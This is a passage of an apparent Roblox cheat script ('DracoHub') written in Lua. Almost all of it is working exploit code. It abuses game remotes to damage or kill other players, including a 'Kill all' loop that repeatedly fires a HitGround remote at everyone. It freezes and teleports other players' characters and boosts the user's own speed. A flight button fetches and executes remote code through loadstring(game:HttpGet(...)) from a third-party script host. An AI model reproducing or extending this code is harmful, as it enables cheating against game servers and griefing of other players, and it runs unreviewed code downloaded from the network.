	if sin then
	sin:FireServer(t.DisplayName)
	sin:FireServer(t.Name)
	sin:FireServer(t.Character)
	end
	if hitG then
	for _ = 1, 2 do
	hitG:FireServer(t.DisplayName)
	hitG:FireServer(t.Name)
	hitG:FireServer(t.Character)
	end
	end
	end
	else
	local combat = vigR and vigR:FindFirstChild("GunshotCombat")
	if combat then
	combat:FireServer()
	end
	local scp = chars and chars:FindFirstChild("SCPGuard")
	local scpR = scp and scp:FindFirstChild("Remotes")
	local hit = scpR and scpR:FindFirstChild("ShotgunHit")
	if hit and t then
	local me = LocalPlayer.Character
	local tc = t.Character
	if me and tc then
	hit:FireServer(me, tc)
	end
	end
	end
	do
	local me = LocalPlayer.Character
	local hum = me and me:FindFirstChildOfClass("Humanoid")
	local an = hum and (hum:FindFirstChildOfClass("Animator") or hum)
	if an then
	local now = tick()
	local startTime = 0.2
	local endTime = 2.0
	local shootStart = 0.5
	local useShoot = false
	if gunLast > 0 and (now - gunLast) < (endTime - startTime) then
	useShoot = true
	end
	gunLast = now
	gunRun = gunRun + 1
	local thisRun = gunRun
	pcall(function()
	if gunTrack then
	gunTrack:Stop(0)
	gunTrack = nil
	end
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://129359541753625"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	gunTrack = tr
	gunTrack.Priority = Enum.AnimationPriority.Action
	gunTrack:Play(0)
	local activeStart = startTime
	if useShoot then
	activeStart = shootStart
	end
	gunTrack.TimePosition = activeStart
	local duration = endTime - activeStart
	if duration < 0.1 then
	duration = 0.1
	end
	task.delay(duration, function()
	if gunRun == thisRun and gunTrack then
	gunTrack:Stop(0)
	gunTrack = nil
	end
	end)
	end
	end)
	end
	end
	end)
	end
end
-- Upthrow：4格有人先閃過去 ThrowDown；有舊動作先入冷卻
UpthrowButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if UpthrowButton:GetAttribute("CD") == true then return end
	if UpthrowButton:GetAttribute("HopBusy") == true then return end
	local throw = findHomelanderThrowDownRemote()
	if not throw then
	UpthrowButton.Text = "No Remote"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.wait(0.5)
	UpthrowButton.Text = "Upthrow"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
	return
	end
	local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local mark, markRoot, markD = nil, nil, nil
	for _, p2 in ipairs(Players:GetPlayers()) do
	if p2 ~= LocalPlayer and p2.Character then
	local r = p2.Character:FindFirstChild("HumanoidRootPart")
	local hum = p2.Character:FindFirstChildOfClass("Humanoid")
	if r and hum and hum.Health > 0 then
	local d = (r.Position - hrp.Position).Magnitude
	if d <= 4 and (not markD or d < markD) then
	mark, markRoot, markD = p2, r, d
	end
	end
	end
	end
	if not mark or not markRoot then
	UpthrowButton.Text = "No Target"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.wait(0.6)
	UpthrowButton.Text = "Upthrow"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
	return
	end
	UpthrowButton:SetAttribute("HopBusy", true)
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	hrp.CFrame = markRoot.CFrame
	local ch = LocalPlayer.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	local animator = hum and hum:FindFirstChildOfClass("Animator")
	local grabTrack = nil
	local grabConn = nil
	if animator then
	for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
	if t and t.Animation and string.find(tostring(t.Animation.AnimationId or ""), "17679955703", 1, true) then
	grabTrack = t
	break
	end
	end
	if not grabTrack then
	grabConn = animator.AnimationPlayed:Connect(function(t)
	if t and t.Animation and string.find(tostring(t.Animation.AnimationId or ""), "17679955703", 1, true) then
	grabTrack = t
	end
	end)
	end
	end
	pcall(function() throw:FireServer() end)
	if animator and not grabTrack then
	local startT = tick()
	while (tick() - startT) < 0.6 do
	if grabTrack then break end
	for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
	if t and t.Animation and string.find(tostring(t.Animation.AnimationId or ""), "17679955703", 1, true) then
	grabTrack = t
	break
	end
	end
	if grabTrack then break end
	task.wait(0.02)
	end
	end
	if grabConn then grabConn:Disconnect() end
	if not grabTrack then
	UpthrowButton.Text = "Miss"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.wait(0.6)
	UpthrowButton.Text = "Upthrow"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
	UpthrowButton:SetAttribute("HopBusy", false)
	return
	end
	UpthrowButton:SetAttribute("CD", true)
	local cdToken = tick()
	UpthrowButton:SetAttribute("CDToken", cdToken)
	UpthrowButton.BackgroundTransparency = 0.5
	task.spawn(function()
	for i = 12, 1, -1 do
	if UpthrowButton:GetAttribute("CDToken") ~= cdToken then break end
	if i > 1 then UpthrowButton.Text = tostring(i - 1) end
	task.wait(1)
	end
	if UpthrowButton:GetAttribute("CDToken") == cdToken then
	UpthrowButton:SetAttribute("CD", false)
	UpthrowButton.Text = "Upthrow"
	UpthrowButton.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
	UpthrowButton.BackgroundTransparency = 0
	UpthrowButton:SetAttribute("HopBusy", false)
	end
	end)
end)
-- Flashstrike
local flashstrikeCooldown = 10
local flashstrikeCooldownActive = false
local function startFlashstrikeCooldown()
	flashstrikeCooldownActive = true
	FlashstrikeButton.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
	FlashstrikeButton.BackgroundTransparency = 0.5
	FlashstrikeButton.Text = tostring(flashstrikeCooldown)
	task.spawn(function()
	for i = flashstrikeCooldown, 1, -1 do
	task.wait(1)
	if not flashstrikeCooldownActive then break end
	if i > 1 then
	FlashstrikeButton.Text = tostring(i - 1)
	end
	end
	flashstrikeCooldownActive = false
	FlashstrikeButton.Text = "Flashstrike"
	FlashstrikeButton.BackgroundColor3 = Color3.fromRGB(30, 60, 180)
	FlashstrikeButton.BackgroundTransparency = 0
	end)
end
FlashstrikeButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if flashstrikeCooldownActive then return end
	if aTrainModActive then
	KickButton:SetAttribute("RumLife", false)
	end
	local remote = findTheFlashCwFinalRemote()
	if remote then
	if simultaneousEnabled then
	for i = 1, simultaneousCount do remote:FireServer() end
	elseif loopInterval > 0 then
	task.spawn(function()
	while loopInterval > 0 do
	remote:FireServer()
	task.wait(loopInterval)
	end
	end)
	else
	remote:FireServer()
	end
	startFlashstrikeCooldown()
	else
	FlashstrikeButton.Text = "No Remote"
	FlashstrikeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.wait(0.5)
	FlashstrikeButton.Text = "Flashstrike"
	FlashstrikeButton.BackgroundColor3 = Color3.fromRGB(30, 60, 180)
	end
end)
-- Kick
KickButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if aTrainModActive then
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	if KickButton.Text == "ON" then
	KickButton.Text = "Speed Crash"
	KickButton.BackgroundColor3 = Color3.fromRGB(20, 90, 140)
	hum.WalkSpeed = 16
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if charactersFolder then
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder.Name == "Tate" then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	local miss = remotesFolder:FindFirstChild("MoveOneMiss")
	if miss then
	miss:FireServer()
	end
	end
	break
	end
	end
	end
	else
	KickButton.Text = "ON"
	KickButton.BackgroundColor3 = Color3.fromRGB(40, 160, 210)
	if KickButton:GetAttribute("RumLoop") ~= true then
	KickButton:SetAttribute("RumLoop", true)
	task.spawn(function()
	local hitBusy = {}
	local runBTrack = nil
	while true do
	if KickButton.Text == "ON" then
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if h then
	h.WalkSpeed = 100
	end
	if h and root then
	local look = root.CFrame.LookVector
	local flat = Vector3.new(look.X, 0, look.Z)
	if flat.Magnitude < 0.05 then
	flat = Vector3.new(0, 0, -1)
	else
	flat = flat.Unit
	end
	pcall(function()
	h:Move(flat, false)
	end)
	pcall(function()
	root.AssemblyLinearVelocity = Vector3.new(flat.X * 100, root.AssemblyLinearVelocity.Y, flat.Z * 100)
	end)
	end
	if runBTrack then
	runBTrack:AdjustSpeed(1)
	elseif h then
	local animator = h:FindFirstChildOfClass("Animator")
	if animator then
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://11759352907"
	runBTrack = animator:LoadAnimation(anim)
	runBTrack.Priority = Enum.AnimationPriority.Action4
	runBTrack.Looped = true
	runBTrack:Play(0, 1, 1)
	runBTrack:AdjustSpeed(1)
	end
	end
	if root then
	local hg = ReplicatedStorage:FindFirstChild("Characters")
	hg = hg and hg:FindFirstChild("Homelander")
	hg = hg and hg:FindFirstChild("Remotes")
	hg = hg and hg:FindFirstChild("HitGround")
	if hg then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local pch = plr.Character
	local pr = pch and pch:FindFirstChild("HumanoidRootPart")
	local ph = pch and pch:FindFirstChildOfClass("Humanoid")
	if pr and ph and ph.Health > 0 and (pr.Position - root.Position).Magnitude <= 4 then
	local pid = tostring(plr.UserId)
	if hitBusy[pid] ~= true then
	hitBusy[pid] = true
	local marked = plr
	task.spawn(function()
	local ch0 = marked.Character
	if ch0 then
	task.spawn(function()
	for _ = 1, 500 do
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch0)
	end)
	end
	end)
	end
	local endTime = tick() + 1.5
	while tick() < endTime do
	local ch = marked.Character
	if not ch then break end
	local hum2 = ch:FindFirstChildOfClass("Humanoid")
	if (not hum2) or hum2.Health <= 0 then break end
	pcall(function()
	hg:FireServer(marked.DisplayName)
	hg:FireServer(marked.Name)
	hg:FireServer(ch)
	end)
	task.wait(0.05)
	end
	hitBusy[pid] = nil
	end)
	end
	end
	end
	end
	end
	end
	else
	if runBTrack then
	runBTrack:Stop()
	runBTrack = nil
	end
	end
	task.wait()
	end
	end)
	end
	end
	return
	end
	local ev = KickButton:FindFirstChild("PunchGo")
	if ev then
	ev:Fire()
	end
end)
do
	local ev = Instance.new("BindableEvent")
	ev.Name = "PunchGo"
	ev.Parent = KickButton
	ev.Event:Connect(function()
	if moveUnlocked then
	return
	end
	if aTrainModActive then
	return
	end
	if kickActive then
	return
	end
	local stab2Remote = findGhostfaceStab2Remote()
	local shieldRemote = findSteveHShieldCounterRemote()
	local webBlossomRemote = findSpiderManWebBlossomRemote()
	kickActive = true
	task.spawn(function()
	while kickActive and webBlossomRemote do
	webBlossomRemote:FireServer()
	task.wait(0.1)
	end
	end)
	if shieldRemote then
	shieldRemote:FireServer()
	end
	task.wait(0.5)
	if stab2Remote then
	stab2Remote:FireServer()
	stab2Remote:FireServer()
	kickActive = false
	KickButton.BackgroundColor3 = Color3.fromRGB(200, 50, 200)
	task.wait(0.1)
	KickButton.BackgroundColor3 = Color3.fromRGB(150, 30, 150)
	else
	kickActive = false
	KickButton.Text = "No Stab2"
	KickButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.wait(0.5)
	KickButton.Text = "One punch"
	KickButton.BackgroundColor3 = Color3.fromRGB(150, 30, 150)
	end
	end)
end
-- Homelander Fly
do
	local flyWait = false
	local flyTok = 0
	FlightToggleBtn.MouseButton1Click:Connect(function()
	if flightTask then return end
	if flyWait then
	flyWait = false
	flyTok = flyTok + 1
	flightTask = task.spawn(function()
	loadstring(game:HttpGet("https://obj.wearedevs.net/197198/scripts/invincible%20flight%20animation.lua"))()
	end)
	FlightToggleBtn.Text = "Homelander Fly (ON)"
	FlightToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	return
	end
	flyWait = true
	flyTok = flyTok + 1
	local my = flyTok
	FlightToggleBtn.BackgroundColor3 = Color3.fromRGB(160, 90, 30)
	task.spawn(function()
	for i = 5, 1, -1 do
	if not flyWait or flyTok ~= my then
	return
	end
	FlightToggleBtn.Text = "Tap again to confirm  " .. tostring(i)
	task.wait(1)
	end
	if flyWait and flyTok == my then
	flyWait = false
	FlightToggleBtn.Text = "Homelander Fly"
	FlightToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 100, 100)
	end
	end)
	end)
end
-- Move Skills Mode
local function updateMoveModeButton()
	if moveUnlocked then
	MoveModeBtn.Size = UDim2.new(0.5, -8, 0, 20)
	MoveModeBtn.Text = "Move Skills: ON"
	MoveModeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	ResetPosBtn.Visible = true
	else
	MoveModeBtn.Size = UDim2.new(1, -10, 0, 20)
	MoveModeBtn.Text = "Move Skills: Locked"
	MoveModeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	ResetPosBtn.Visible = false
	end
end
MoveModeBtn.MouseButton1Click:Connect(function()
	moveUnlocked = not moveUnlocked
	updateMoveModeButton()
end)
updateMoveModeButton()
ResetPosBtn.MouseButton1Click:Connect(function()
	LaserButton.Position = DEFAULT_POSITIONS.Laser
	UpthrowButton.Position = DEFAULT_POSITIONS.Upthrow
	FlashstrikeButton.Position = DEFAULT_POSITIONS.Flashstrike
	KickButton.Position = DEFAULT_POSITIONS.Kick
	MoAimButton.Position = DEFAULT_POSITIONS.MoAim
	if KiraAimButton then
	KiraAimButton.Position = DEFAULT_POSITIONS.MoAim
	end
	local fgR = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fgR then
	local gunR = fgR:FindFirstChild("DeadpoolSkill")
	if gunR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	gunR.Position = UDim2.new(0.5, -140, 1, -96)
	else
	gunR.Position = DEFAULT_POSITIONS.Laser
	end
	end
	local liR = fgR:FindFirstChild("LifeInsure")
	if liR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	liR.Position = UDim2.new(0.5, 68, 1, -96)
	else
	liR.Position = UDim2.new(1, -240, 0.5, -156)
	end
	end
	local roarR = fgR:FindFirstChild("Roar")
	if roarR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	roarR.Position = UDim2.new(0.5, -140, 1, -96)
	else
	roarR.Position = DEFAULT_POSITIONS.Laser
	end
	end
	end
	local slR = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shR = slR and slR:FindFirstChild("DeadpoolShoot")
	if shR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	shR.Position = UDim2.new(0.5, -88, 1, -96)
	else
	shR.Position = UDim2.new(1, -240, 0.5, -64)
	end
	end
end)
MinusBtn.MouseButton1Click:Connect(function()
	if not moveUnlocked then
	return
	end
	moveUnlocked = false
	updateMoveModeButton()
	LaserButton.Position = DEFAULT_POSITIONS.Laser
	UpthrowButton.Position = DEFAULT_POSITIONS.Upthrow
	FlashstrikeButton.Position = DEFAULT_POSITIONS.Flashstrike
	KickButton.Position = DEFAULT_POSITIONS.Kick
	MoAimButton.Position = DEFAULT_POSITIONS.MoAim
	if KiraAimButton then
	KiraAimButton.Position = DEFAULT_POSITIONS.MoAim
	end
	local fgR = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fgR then
	local gunR = fgR:FindFirstChild("DeadpoolSkill")
	if gunR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	gunR.Position = UDim2.new(0.5, -140, 1, -96)
	else
	gunR.Position = DEFAULT_POSITIONS.Laser
	end
	end
	local liR = fgR:FindFirstChild("LifeInsure")
	if liR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	liR.Position = UDim2.new(0.5, 68, 1, -96)
	else
	liR.Position = UDim2.new(1, -240, 0.5, -156)
	end
	end
	local roarR = fgR:FindFirstChild("Roar")
	if roarR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	roarR.Position = UDim2.new(0.5, -140, 1, -96)
	else
	roarR.Position = DEFAULT_POSITIONS.Laser
	end
	end
	end
	local slR = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shR = slR and slR:FindFirstChild("DeadpoolShoot")
	if shR then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	shR.Position = UDim2.new(0.5, -88, 1, -96)
	else
	shR.Position = UDim2.new(1, -240, 0.5, -64)
	end
	end
end)
local function setupDrag(button)
	local dragging = false
	local dragStart, startPos
	button.InputBegan:Connect(function(input)
	if not moveUnlocked then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	dragging = true
	dragStart = input.Position
	startPos = button.Position
	end
	end)
	UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	dragging = false
	end
	end)
	UIS.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	local delta = input.Position - dragStart
	button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	end)
end
setupDrag(LaserButton)
setupDrag(UpthrowButton)
setupDrag(FlashstrikeButton)
setupDrag(KickButton)
setupDrag(MoAimButton)
do
	local fgD = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local function hookMove(b)
	if b and (b.Name == "DeadpoolSkill" or b.Name == "LifeInsure" or b.Name == "Roar") then
	setupDrag(b)
	end
	end
	if fgD then
	for _, ch in ipairs(fgD:GetChildren()) do
	hookMove(ch)
	end
	fgD.ChildAdded:Connect(hookMove)
	end
	local slD = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shD = slD and slD:FindFirstChild("DeadpoolShoot")
	if shD then
	setupDrag(shD)
	end
end
-- ==================== Mods ====================
local function stopKillAllTeleport()
	killAllActive = false
	if killAllTeleportThread then
	task.cancel(killAllTeleportThread)
	killAllTeleportThread = nil
	end
	for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer and player.Character then
	local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP then
	targetHRP.Anchored = false
	end
	end
	end
end
local function startKillAllTeleport()
	if killAllActive then return end
	killAllActive = true
	killAllTeleportThread = task.spawn(function()
	local connection
	connection = RunService.Heartbeat:Connect(function()
	if not killAllActive then
	connection:Disconnect()
	return
	end
	local char = LocalPlayer.Character
	if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local offsetPos = hrp.CFrame.Position + (hrp.CFrame.LookVector * KILLALL_OFFSET)
	local lockCFrame = CFrame.new(offsetPos, offsetPos + hrp.CFrame.LookVector)
	for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer and player.Character then
	local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP then
	targetHRP.Anchored = true
	targetHRP.CFrame = lockCFrame
	targetHRP.AssemblyLinearVelocity = Vector3.zero
	targetHRP.AssemblyAngularVelocity = Vector3.zero
	pcall(function()
	targetHRP.Velocity = Vector3.zero
	targetHRP.RotVelocity = Vector3.zero
	end)
	end
	end
	end
	end)
	while killAllActive do
	task.wait(0.05)
	end
	if connection then
	connection:Disconnect()
	end
	end)
end
local function doKillAll()
	if killAllActive then return end
	KillAllBtn.Text = "Killing..."
	KillAllBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
	local endTime = tick() + 2
	while tick() < endTime do
	local remote = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	remote:FireServer(plr.DisplayName)
	remote:FireServer(plr.Name)
	remote:FireServer(plr.Character)
	end
	end
	task.wait(0.05)
	end
	KillAllBtn.Text = "Kill all Once"
	KillAllBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
end
local function startFinisherLoop()
	if finisherActive then return end
	local remote = findAmazoFinisherRemote()
	if not remote then return end
	finisherActive = true
	finisherLoopThread = task.spawn(function()
	while finisherActive do
	remote:FireServer()
	task.wait(0.1)
	end
	end)
end
local function stopFinisherLoop()
	finisherActive = false
	if finisherLoopThread then
	task.cancel(finisherLoopThread)
	finisherLoopThread = nil
	end
end
local function updateAllButtonsVisibility()
	do
	local fgG = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gunB = fgG and fgG:FindFirstChild("DeadpoolSkill")
	if gunB then
	if homelanderModActive or aTrainModActive or kiraAim then
	gunB.Visible = false
	else
	local hb = Page2Scroll:FindFirstChild("HealRegenModBtn")
	local liG = fgG and fgG:FindFirstChild("LifeInsure")
	if hb and hb:GetAttribute("On") == true and liG and liG.Visible then
	local roarG = fgG and fgG:FindFirstChild("Roar")
	if roarG and roarG.Visible then
	gunB.Visible = false
	else
	gunB.Visible = true
	gunB.ZIndex = 20
	end
	end
	end
	end
	end
	if homelanderModActive then
	LaserButton.Visible = true
	do
	local fin = FloatingGui:FindFirstChild("ATrainFinish")
	if fin then fin.Visible = false end
	end
	UpthrowButton.Visible = true
	FlashstrikeButton.Visible = true
	KickButton.Text = "One punch"
	KickButton.BackgroundColor3 = Color3.fromRGB(150, 30, 150)
	KickButton.Visible = true
	MoAimButton.Visible = false
	local st = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	st = st and st:FindFirstChild("Stalk")
	if st then st.Visible = false end
	local stm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stm = stm and stm:FindFirstChild("MMLifeInsure")
	if stm then
	stm.Visible = false
	local stb = stm:FindFirstChild("MmBar")
	if stb then stb.Visible = false end
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	FlashstrikeButton.Size = UDim2.new(0, 44, 0, 44)
	LaserButton.Size = UDim2.new(0, 44, 0, 44)
	KickButton.Size = UDim2.new(0, 44, 0, 44)
	UpthrowButton.Size = UDim2.new(0, 44, 0, 44)
	LaserButton.Position = UDim2.new(0.5, -88, 1, -96)
	KickButton.Position = UDim2.new(0.5, -36, 1, -96)
	FlashstrikeButton.Position = UDim2.new(0.5, -192, 1, -96)
	UpthrowButton.Position = UDim2.new(0.5, 16, 1, -96)
	else
	FlashstrikeButton.Size = UDim2.new(0, 60, 0, 30)
	FlashstrikeButton.Position = UDim2.new(1, -310, 0.5, -138)
	LaserButton.Size = UDim2.new(0, 60, 0, 30)
	LaserButton.Position = DEFAULT_POSITIONS.Laser
	KickButton.Size = UDim2.new(0, 60, 0, 60)
	KickButton.Position = UDim2.new(1, -310, 0.5, -100)
	UpthrowButton.Size = UDim2.new(0, 60, 0, 60)
	UpthrowButton.Position = DEFAULT_POSITIONS.Upthrow
	end
	do
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local extra = (fg and fg:FindFirstChild("HomeExtra")) or FloatingGui:FindFirstChild("HomeExtra")
	if extra then
	extra.Visible = true
	extra.Text = "Tear"
	local hz = extra:FindFirstChild("PcHint")
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	extra.Size = UDim2.new(0, 44, 0, 44)
	extra.Position = UDim2.new(0.5, -140, 1, -96)
	if hz then hz.Visible = true end
	else
	extra.Size = UDim2.new(0, 60, 0, 30)
	extra.Position = UDim2.new(1, -240, 0.5, -138)
	if hz then hz.Visible = false end
	end
	end
	end
	elseif aTrainModActive then
	LaserButton.Visible = false
	do
	local extra = FloatingGui:FindFirstChild("HomeExtra")
	if extra then extra.Visible = false end
	end
	UpthrowButton.Visible = false
	FlashstrikeButton.Visible = true
	KickButton.Text = "Speed Crash"
	KickButton.BackgroundColor3 = Color3.fromRGB(20, 90, 140)
	KickButton.Visible = true
	MoAimButton.Visible = true
	local st = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	st = st and st:FindFirstChild("Stalk")
	if st then st.Visible = false end
	local stm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stm = stm and stm:FindFirstChild("MMLifeInsure")
	if stm then
	stm.Visible = false
	local stb = stm:FindFirstChild("MmBar")
	if stb then stb.Visible = false end
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	FlashstrikeButton.Size = UDim2.new(0, 44, 0, 44)
	MoAimButton.Size = UDim2.new(0, 44, 0, 44)
	KickButton.Size = UDim2.new(0, 44, 0, 44)
	FlashstrikeButton.Position = UDim2.new(0.5, -140, 1, -96)
	MoAimButton.Position = UDim2.new(0.5, -88, 1, -96)
	KickButton.Position = UDim2.new(0.5, -36, 1, -96)
	do
	local fin = FloatingGui:FindFirstChild("ATrainFinish")
	if not fin then
	fin = Instance.new("TextButton")
	fin.Name = "ATrainFinish"
	fin.BackgroundColor3 = Color3.fromRGB(60, 50, 130)
	fin.TextColor3 = Color3.fromRGB(255, 255, 255)
	fin.Font = Enum.Font.GothamBold
	fin.TextScaled = true
	fin.TextWrapped = true
	fin.Text = "Finish"
	fin.Visible = false
	fin.Parent = FloatingGui
	local fc = Instance.new("UICorner")
	fc.CornerRadius = UDim.new(0, 8)
	fc.Parent = fin
	if fin:GetAttribute("Hooked") ~= true then
	fin:SetAttribute("Hooked", true)
	fin.MouseButton1Click:Connect(function()
	if fin:GetAttribute("Busy") == true then return end
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end
	local best, bestD = nil, 20
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - hrp.Position).Magnitude
	if d <= bestD then best, bestD = plr, d end
	end
	end
	end
	if not best then
	local root = hrp
	local mdl = Instance.new("Model")
	mdl.Name = "YYDSRangeCircleMdl"
	mdl.Parent = workspace
	local floor = Instance.new("Part")
	floor.Shape = Enum.PartType.Cylinder
	floor.Anchored = true
	floor.CanCollide = false
	floor.CanQuery = false
	floor.CanTouch = false
	floor.CastShadow = false
	floor.Material = Enum.Material.SmoothPlastic
	floor.Color = Color3.fromRGB(200, 40, 40)
	floor.Transparency = 0.78
	floor.Parent = mdl
	local rims = {}
	for i = 1, 24 do
	local rim = Instance.new("Part")
	rim.Anchored = true
	rim.CanCollide = false
	rim.CanQuery = false
	rim.CanTouch = false
	rim.CastShadow = false
	rim.Material = Enum.Material.SmoothPlastic
	rim.Color = Color3.fromRGB(220, 50, 50)
	rim.Transparency = 0.35
	rim.Parent = mdl
	rims[i] = rim
	end
	local startT = tick()
	local conn
	conn = RunService.Heartbeat:Connect(function()
	if tick() - startT > 0.35 then
	conn:Disconnect()
	if mdl.Parent then mdl:Destroy() end
	return
	end
	local ch2 = LocalPlayer.Character
	local root2 = ch2 and ch2:FindFirstChild("HumanoidRootPart")
	if not root2 then return end
	local hum2 = ch2:FindFirstChildOfClass("Humanoid")
	local hip = hum2 and (hum2.HipHeight + 0.15) or 3
	local pos = Vector3.new(root2.Position.X, root2.Position.Y - hip, root2.Position.Z)
	floor.Size = Vector3.new(0.12, 40, 40)
	floor.CFrame = CFrame.new(pos) * CFrame.Angles(0, 0, math.rad(90))
	local seg = (2 * math.pi * 25) / 24 * 1.08
	for i = 1, 24 do
	local a = (i / 24) * math.pi * 2
	local pp = pos + Vector3.new(math.cos(a) * 20, 0.22, math.sin(a) * 20)
	rims[i].Size = Vector3.new(0.18, 0.44, seg)
	rims[i].CFrame = CFrame.lookAt(pp, pp + Vector3.new(-math.sin(a), 0, math.cos(a)))
	end
	end)
	return
	end
	fin:SetAttribute("Busy", true)
	task.spawn(function()
	local old1 = game:GetService("SoundService"):FindFirstChild("YYDSFinishS1")
	local old2 = game:GetService("SoundService"):FindFirstChild("YYDSFinishS2")
	if old1 then old1:Destroy() end
	if old2 then old2:Destroy() end
	local s1 = Instance.new("Sound")
	s1.Name = "YYDSFinishS1"
	s1.SoundId = "rbxassetid://17510383179"
	s1.Volume = 1
	s1.Parent = game:GetService("SoundService")
	s1:Play()
	task.wait(2)
	if s1.Parent then s1:Stop() s1:Destroy() end
	local s2 = Instance.new("Sound")
	s2.Name = "YYDSFinishS2"
	s2.SoundId = "rbxassetid://99543421960138"
	s2.Volume = 1
	s2.Parent = game:GetService("SoundService")
	s2:Play()
	s2.Ended:Connect(function()
	if s2.Parent then s2:Destroy() end
	end)
	end)
	local saved = hum.WalkSpeed
	hum.WalkSpeed = 0
	local lock = RunService.Heartbeat:Connect(function()
	if fin:GetAttribute("Busy") ~= true then return end
	local h3 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h3 then h3.WalkSpeed = 0 end
	end)
	local dots = {"● ● ●", "● ● ○", "● ○ ●", "○ ● ●"}
	local di = 1
	task.spawn(function()
	while fin:GetAttribute("Busy") == true do
	fin.Text = dots[di]
	di = di % #dots + 1
	task.wait(0.25)
	end
	end)
	local an = hum:FindFirstChildOfClass("Animator") or hum
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://110361484166291"
	local ok, tr = pcall(function() return an:LoadAnimation(anim) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr.Looped = false
	tr:Play(0)
	end
	local hg = ReplicatedStorage:FindFirstChild("Characters")
